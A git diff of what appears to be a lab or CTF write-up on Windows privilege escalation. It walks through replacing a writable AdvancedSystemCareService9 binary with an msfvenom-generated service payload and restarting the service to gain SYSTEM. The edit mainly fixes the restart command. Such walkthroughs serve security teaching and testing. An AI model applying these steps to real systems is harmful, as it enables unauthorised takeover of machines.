@@ -11,22 +11,22 @@
 ![image](https://github.com/user-attachments/assets/c654f5d6-c79f-4908-ab09-f254b8f84b09)
 ![image](https://github.com/user-attachments/assets/59087828-022b-4739-bfa8-f96f496984d6)
 
-AdvancedSystemCareService9 -> CanRestart =True -> app ASCService.exe write-able
+AdvancedSystemCareService9 --> CanRestart =True --> app ASCService.exe write-able
 
 ![image](https://github.com/user-attachments/assets/e3fbaf49-2cbe-4e08-84c7-99faf50f35be)
 ![image](https://github.com/user-attachments/assets/917edfc3-ba1a-473c-82b1-b8272cc6fe94)
 ![image](https://github.com/user-attachments/assets/ceecf8ff-2050-463d-a8b5-7cbd7e989729)
 ![image](https://github.com/user-attachments/assets/6cb1f67f-03f7-439d-ac5e-6c2b9eaad4d5)
 
-1. Check service status -- Get-Service -Name "AdvancedSystemCareService9"
+1. Check service status --> Get-Service -Name "AdvancedSystemCareService9"
 
-2. Stop service -- Stop-Service AdvancedSystemCareService9
+2. Stop service --> Stop-Service AdvancedSystemCareService9
 
-3. Generate payload  -- msfvenom -f exe-service -o ASCService.exe
+3. Generate payload  --> msfvenom -f exe-service -o ASCService.exe
 
 4. Replace original service exe with payload
 
-5. Restart service -- Stop-Service AdvancedSystemCareService9
+5. Restart service --> Restart-Service -Name "AdvancedSystemCareService9"
 
 6. PrivEsc to SYSTEM
 
